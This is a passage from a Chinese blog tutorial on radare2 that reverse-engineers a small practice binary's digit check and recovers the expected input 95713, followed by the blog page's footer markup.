+<p><img src="/.io//image-20240210141931919.png" alt="image-20240210141931919"></p>
+<p>pd打印反汇编代码并查找对应的位置</p>
+<p><img src="/.io//image-20240210142035016.png" alt="image-20240210142035016"></p>
+<p>我们可以看到在0x2e4引用，所以我们搜索这个地址，并打印该函数：（s addr 用于定位到某个地址，pdf用于打印出反汇编函数）</p>
+<p><img src="/.io//image-20240210142133980.png" alt="image-20240210142133980"></p>
+<p>我们可以看到，radare2识别出我们的函数从0x274开始。在底部有一些比较操作，然后跳转到失败的消息或者其他消息（字符串在0x02ee），我们去那儿看看。（ps意思是打印字符串，@是一个临时搜索）</p>
+<p><img src="/.io//image-20240210142348760.png" alt="image-20240210142348760"></p>
+<p>我们找到了win</p>
+<p>那么我们给0x274重命名为check_input，然后开始分析</p>
+<p><img src="/.io//image-20240210142835655.png" alt="image-20240210142835655"></p>
+<p>VV需要大写</p>
+<p><img src="/.io//image-20240210142952910.png" alt="image-20240210142952910"></p>
+<p>可以看到，函数结合了很多跳转和if条件语句</p>
+<p>我们发现函数检查每个数字，并将其与正确的比较。在左边我们可以看到有效数字。让我们快速查看这些块。我们使用p在不同视图之间再次切换，直到达到常规图形模式。</p>
+<p><img src="/.io//image-20240210143034616.png" alt="image-20240210143034616"></p>
+<p>简单地看了一下，大概地明白程序的意思了：二进制程序检查是否每个位置上的数字都与特定的值相等。使用cmp imm命令按照这个顺序:3,7,5,1,9检查。</p>
+<p><img src="/.io//image-20240210143414426.png" alt="image-20240210143414426"></p>
+<p>再仔细分析汇编，</p>
+<p>在第一个块中，0x4被移动到hl（ld指令)，而hl又移动到寄存器bc，然后bc中引用的值与0x3进行比较。bc指向我们的输入，因此此处的检查功能检查bc+4是否等于0x3。在下一个块中，我们可以看到返回到其原始值的bc现在增加了两次(Inc)（bc+2），它所引用的值与0x7进行了比较。在示例的最后一个块中，bc返回其初始值，然后递增一次，其引用值与0x5比较。</p>
+<p>那么逻辑就应该是这样的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span> (guess):   </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> guess[<span class="number">4</span>]==<span class="number">3</span> <span class="keyword">and</span> guess[<span class="number">2</span>]==<span class="number">7</span> <span class="keyword">and</span> guess[<span class="number">1</span>]==<span class="number">5</span> andguess[<span class="number">3</span>]==<span class="number">1</span> <span class="keyword">and</span> guess[<span class="number">0</span>]==<span class="number">9</span>:</span><br><span class="line"></span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;WIN!&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">           <span class="built_in">print</span> <span class="string">&quot;FAIL!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>由上述代码代码逻辑可以看出，输入的数字作为数组排列的话，真实顺序应该为95713</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://qianmuoy.github.io">qianmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://qianmuoy.github.io/2024/03/01/Radare%E5%85%A5%E9%97%A8/">https://qianmuoy.github.io/2024/03/01/Radare%E5%85%A5%E9%97%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/01/ROP%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/" title="ROP技术实战"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ROP技术实战</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/06/SSDTHook/" title="SSDTHook"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">SSDTHook</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">qianmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/QianMuOY"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Radare%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6"><span class="toc-number">1.</span> <span class="toc-text">Radare入门到进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E9%97%A8"><span class="toc-number">1.2.</span> <span class="toc-text">入门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6"><span class="toc-number">1.3.</span> <span class="toc-text">进阶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6-1"><span class="toc-number">1.4.</span> <span class="toc-text">进阶</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/APC%E6%B3%A8%E5%85%A5/" title="APC注入">APC注入</a><time datetime="2024-03-09T12:40:40.000Z" title="Created 2024-03-09 20:40:40">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98/" title="使用内核内存">使用内核内存</a><time datetime="2024-03-09T12:39:58.000Z" title="Created 2024-03-09 20:39:58">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E4%BD%BF%E7%94%A8Lookaside%E5%86%85%E5%AD%98/" title="使用Lookaside内存">使用Lookaside内存</a><time datetime="2024-03-09T12:39:17.000Z" title="Created 2024-03-09 20:39:17">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90%E6%8B%A6%E6%88%AADLL%E8%AE%BE%E7%BD%AE/" title="内核解析拦截DLL设置">内核解析拦截DLL设置</a><time datetime="2024-03-09T12:38:13.000Z" title="Created 2024-03-09 20:38:13">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E7%AA%81%E7%A0%B4SafeSEH/" title="突破SafeSEH">突破SafeSEH</a><time datetime="2024-03-09T12:37:05.000Z" title="Created 2024-03-09 20:37:05">2024-03-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By qianmu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="https://www.liuzehe.top/upload/bkjs/yinghua.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":120,"height":260},"mobile":{"show":"flase"},"log":false});</script></body></html>
